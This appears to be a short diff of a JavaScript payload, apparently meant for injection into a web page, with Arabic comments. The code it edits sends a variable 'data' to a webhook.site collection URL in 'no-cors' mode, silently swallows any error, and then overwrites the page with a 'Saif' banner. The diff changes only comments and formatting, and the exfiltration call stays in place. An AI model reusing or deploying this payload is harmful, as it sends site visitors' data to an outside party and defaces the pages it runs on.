@@ -9,9 +9,15 @@
   try {
     await fetch(https://webhook.site/3dd75195-9a2f-4eb2-90e4-a036f13bdd9b?data=${data}, {
       method: "GET",
-      mode: "no-cors" // يحاول تجاوز CORS لكنه مخفي ومحدد
+      mode: "no-cors" // يحاول تجاوز سياسة CORS لكنه محدود
     });
-  } catch (e) {}
+  } catch (e) {
+    // ممكن تضيف لوج هنا لو حبيت
+  }
 
-  document.body.innerHTML = <div style="color:#0f0; background:#111; font-family:monospace; font-size:2em; height:100vh; display:flex; justify-content:center; align-items:center;">Saif</div>;
+  document.body.innerHTML = `
+    <div style="color:#0f0; background:#111; font-family: monospace; font-size: 2em; height: 100vh; display: flex; justify-content: center; align-items: center;">
+      Saif
+    </div>
+  `;
 })();
